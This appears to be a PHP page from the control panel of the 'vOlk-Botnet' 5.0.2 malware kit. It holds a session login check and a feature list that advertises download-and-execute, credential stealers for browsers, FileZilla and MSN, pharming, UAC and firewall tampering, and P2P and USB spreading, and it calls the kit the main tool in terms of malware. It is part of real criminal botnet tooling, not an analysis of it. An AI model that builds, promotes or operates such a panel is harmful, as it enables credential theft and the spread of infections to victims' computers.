<?php @session_start(); if ( !isset($_SESSION['login']) ){ header ("Location: ../");  exit() ; }	?>
<table width="837" style="height:163px" border="0" cellspacing="0" cellpadding="0">
								  <tr>
									<td width="837" style="height:163px" valign="top">
										<div>
										  <h5 align="left">
											<font color="#999999">[vOlk-Botnet] 
											5.0.2 
											v<br>
											<br>
											Features<br>
											[+] Add Startup<br>
											[+] Melt Mutex<br>
											[+] Download & Execute.<br>
											[+] Stealer IE/7/8.<br />
											[+] Open Url in default browser.<br>
											[+] Pharming.<br>
											[+] UAC Disabler<br>
											[+] Add FireWall<br>
											[+] Task Manger<br>
											[+] Stealer FTP(Filezilla)<br>
											[+] Msn Stealer(Messenger Save User)<br>
											[+] Statistics Bot's<br>
											[+] Spread P2P<br>
											[+] Spread USB<br>
											[+] Update Bot<br>
											<br>
											[vOlk-Botnet] is a remote administration tool, its administration is based on HTTP, the operation code simple and easy hiso that Volk is the main tool in terms of malware.
The code created by [byvOlk] PHP and Visual Basic 6.0</font></h5>
									  </div>
									</td>
								  </tr>
								</table>
							